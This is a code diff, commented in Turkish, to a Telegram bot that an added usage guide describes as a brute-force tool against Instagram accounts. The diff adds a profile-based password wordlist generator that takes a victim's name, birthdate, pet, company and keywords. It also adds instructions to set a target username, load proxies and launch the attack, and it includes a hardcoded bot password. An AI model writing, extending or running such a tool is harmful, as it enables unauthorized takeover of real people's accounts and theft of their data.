@@ -758,7 +758,47 @@ class TelegramBot:
             except ValueError:
                 await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
 
-        # Diğer awaiting durumları için benzer işlemler...
+        elif awaiting == 'password_profile':
+            try:
+                profile_input = update.message.text.strip().split(',')
+                if len(profile_input) < 1:
+                    await update.message.reply_text("❌ Lütfen geçerli bir formatta bilgi gir!")
+                    return
+                
+                profile = {
+                    'firstname': profile_input[0].strip() if len(profile_input) > 0 else '',
+                    'lastname': profile_input[1].strip() if len(profile_input) > 1 else '',
+                    'birthdate': profile_input[2].strip() if len(profile_input) > 2 else '',
+                    'pet': profile_input[3].strip() if len(profile_input) > 3 else '',
+                    'company': profile_input[4].strip() if len(profile_input) > 4 else '',
+                    'keywords': profile_input[5].split() if len(profile_input) > 5 else [],
+                    'leetmode': '-leet' in profile_input,
+                    'spechars': '-spec' in profile_input,
+                    'randnum': '-rand' in profile_input
+                }
+                
+                # Şifre listesini oluştur
+                wordlist = self.password_generator.generate_wordlist(profile)
+                if not wordlist:
+                    await update.message.reply_text("❌ Şifre listesi oluşturulamadı! Lütfen bilgileri kontrol et.")
+                    return
+                
+                # Şifreleri dosyaya kaydet
+                file_path = f"generated_passwords_{user_id}.txt"
+                with open(file_path, 'w', encoding='utf-8') as f:
+                    for password in wordlist:
+                        f.write(password + '\n')
+                
+                # Kullanıcıya dosyayı gönder
+                with open(file_path, 'rb') as f:
+                    await update.message.reply_document(document=InputFile(f, filename=f"passwords_{user_id}.txt"),
+                                                    caption=f"✅ {len(wordlist)} şifre oluşturuldu!")
+                
+                # Oluşturulan dosyayı user_data'ya kaydet
+                self.user_data[user_id]['password_file'] = file_path
+                context.user_data['awaiting'] = None
+            except Exception as e:
+                await update.message.reply_text(f"❌ Hata oluştu: {str(e)}")
 
     async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
@@ -774,6 +814,17 @@ class TelegramBot:
             await query.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
             context.user_data['awaiting'] = 'password_file'
 
+        elif query.data == 'generate_password_list':
+            await query.message.reply_text(
+                "🔑 Şifre listesi oluşturmak için bilgileri gir:\n"
+                "Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler\n"
+                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2\n"
+                "Not: Doğum tarihi DDMMYYYY formatında olmalı. Anahtar kelimeler boşlukla ayrılmalı.\n"
+                "Seçenekler: -leet (leet mode), -spec (özel karakterler), -rand (rastgele sayılar)\n"
+                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -spec"
+            )
+            context.user_data['awaiting'] = 'password_profile'
+
         elif query.data == 'set_proxy_file':
             await query.message.reply_text("🌐 Lütfen proxy listesi dosyasını (.txt) yükle:")
             context.user_data['awaiting'] = 'proxy_file'
@@ -781,6 +832,40 @@ class TelegramBot:
         elif query.data == 'set_timeout':
             await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
             context.user_data['awaiting'] = 'timeout'
+
+        elif query.data == 'how_to_use':
+            how_to_message = """
+            📖 **Bot Kullanım Kılavuzu** 📖
+            
+            Bu bot, Instagram hesaplarına yönelik bir brute force aracıdır. Aşağıdaki adımları takip ederek kullanabilirsiniz:
+            
+            1. **Şifre Girişi**: Botu başlatmak için /start komutunu kullanın ve bot şifresini girin (varsayılan: vio1911).
+            
+            2. **Kullanıcı Adı Ayarla**: "🎯 Kullanıcı Adı Gir" butonuna tıklayın ve hedef Instagram kullanıcı adını girin.
+            
+            3. **Şifre Listesi Yükle veya Oluştur**:
+               - **Yükle**: "📜 Şifre Listesi Yükle" butonuna tıklayın ve bir .txt dosyası yükleyin (her satırda bir şifre).
+               - **Oluştur**: "🔑 Şifre Listesi Oluştur" butonuna tıklayın ve profil bilgilerini girin (ad, soyad, doğum tarihi vb.).
+                 Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler,-leet -spec -rand
+                 Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -spec
+            
+            4. **Proxy Listesi Yükle**: (Opsiyonel) "🌐 Proxy Listesi Yükle" butonuna tıklayın ve bir proxy listesi (.txt) yükleyin.
+            
+            5. **Timeout Ayarla**: (Opsiyonel) "⏰ Timeout Ayarla" butonuna tıklayın ve deneme süresini saniye cinsinden girin (60-7200 arası).
+            
+            6. **Saldırıyı Başlat**: "🚀 Saldırıyı Başlat" butonuna tıklayın. Bot, yüklediğiniz şifre listesini kullanarak hedef hesaba deneme yapacaktır.
+            
+            7. **İptal**: Herhangi bir anda "❌ İptal" butonuna basarak işlemi durdurabilirsiniz.
+            
+            ⚠️ **Notlar**:
+            - Bot, Instagram'ın güvenlik mekanizmalarına (CAPTCHA, 2FA, checkpoint) karşı hassastır.
+            - Proxy kullanımı önerilir.
+            - Oluşturulan şifre listesi otomatik olarak kaydedilir ve saldırı için kullanılabilir.
+            - Botun kullanımı tamamen kullanıcının sorumluluğundadır.
+            
+            Sorularınız için tekrar bu menüye dönebilirsiniz!
+            """
+            await query.message.reply_text(how_to_message, parse_mode='Markdown')
 
         elif query.data == 'start_attack':
             await self.start_attack(update, context)
